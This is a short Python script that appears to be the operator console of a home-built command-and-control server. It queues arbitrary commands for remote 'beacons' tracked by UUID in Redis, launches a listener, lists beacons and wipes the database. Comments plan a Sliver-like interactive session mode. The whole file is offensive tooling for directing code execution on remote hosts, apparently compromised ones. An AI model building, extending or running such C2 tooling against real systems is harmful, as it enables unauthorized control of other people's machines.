import subprocess
import redis
from datetime import datetime
import json

# Needs a function to wipe the db and make all active beacons check in again

conn = redis.StrictRedis(host='localhost', port=6379, db=0)

def clearDB():
    for key in conn.scan_iter("*"):
        conn.delete(key)

def searchUUID(uuid):
    print(conn.hget('UUID', uuid))

while True:
    # We should change this to a help dialogue
    # If command is empty, display the help dialogue
    # Add a GetLastCommand command
    # Add an interact option so that you enter a session with a beacon
    # Sort of akin to Sliver
    # Add an await option. After a command, await the redis update, then display
    # Set command and then await for a new var to be set
    # We will set the retrieved value when it fetches a new command
    # If retrieved is 0, then don't display. If it's 1, display the result and then reset to 0
    inp = input('(1)Enter command / '
                '(2)Search by UUID / '
                '(3)Clear DB / '
                '(4)Start a listener / '
                '(5)List all')
    if inp == '1':
        uuid = input('UUID: ')
        comm = input('Command: ')
        # I want to preserve the current last check in time
        # so dump the DB and grab that field
        dt = conn.hget('UUID', uuid)  # Get the struct
        dt = dt.decode()  # Decode it from bytes
        lastcheckin = json.loads(dt)  # it's returned as string so convert it to dict
        structure = json.dumps(lastcheckin)  # Dump the dict to json
        lci = json.loads(structure)  # Load it into a new var
        LastCheckIn = lci["LastCheckIn"]  # Grab the command var from the object
        structure = {
            "Retrieved:": "0",
            "Command": f"{comm}",
            "LastInteraction": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
            "LastCheckIn": f"{LastCheckIn}",
            "Result": "0"
        }
        structure = json.dumps(structure)  # Dump the json
        # Write the message value to the beacon:UUID key
        conn.hset('UUID', uuid, structure)


    elif inp == '2':
        uuid = input('UUID: ')
        searchUUID(uuid)
    elif inp == '3':
        clearDB()
    elif inp == "4":
        subprocess.Popen(["python3", "listener.py"])
    else:
        #print(conn.keys()) # UUID is the key but we want values from the key
        print(conn.hgetall('UUID')) # We're searching by hash values here